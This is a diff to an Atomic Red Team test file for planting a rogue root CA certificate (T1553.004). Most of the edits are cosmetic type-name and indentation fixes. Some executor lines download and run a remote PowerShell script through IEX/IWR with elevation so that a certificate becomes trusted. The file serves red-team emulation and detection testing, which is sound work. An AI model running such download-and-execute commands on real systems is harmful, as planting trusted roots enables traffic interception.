@@ -10,11 +10,11 @@ atomic_tests:
   input_arguments:
     cert_filename:
       description: Path of the CA certificate we create
-      type: Path
+      type: path
       default: rootCA.crt
     key_filename:
       description: Key we create that is used to create the CA certificate
-      type: Path
+      type: path
       default: rootCA.key
   executor:
     command: |
@@ -36,11 +36,11 @@ atomic_tests:
   input_arguments:
     cert_filename:
       description: CA file name
-      type: Path
+      type: path
       default: rootCA.crt
     key_filename:
       description: Key we create that is used to create the CA certificate
-      type: Path
+      type: path
       default: rootCA.key
   dependency_executor_name: sh
   dependencies:
@@ -66,11 +66,11 @@ atomic_tests:
   input_arguments:
     cert_filename:
       description: CA file name
-      type: Path
+      type: path
       default: rootCA.crt
     key_filename:
       description: Key we create that is used to create the CA certificate
-      type: Path
+      type: path
       default: rootCA.key
   dependency_executor_name: sh
   dependencies:
@@ -95,7 +95,7 @@ atomic_tests:
   input_arguments:
     pfx_path:
       description: Path of the certificate
-      type: Path
+      type: path
       default: rootCA.cer
   dependency_executor_name: powershell
   dependencies:
@@ -129,7 +129,7 @@ atomic_tests:
   input_arguments:
     pfx_path:
       description: Path of the certificate
-      type: Path
+      type: path
       default: $env:Temp\rootCA2.cer
   dependency_executor_name: powershell
   dependencies:
@@ -162,8 +162,8 @@ atomic_tests:
   - windows
   executor:
     command: |
-       IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
+      IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
     cleanup_command: |
-       Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item 
+      Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item 
     name: powershell
     elevation_required: true
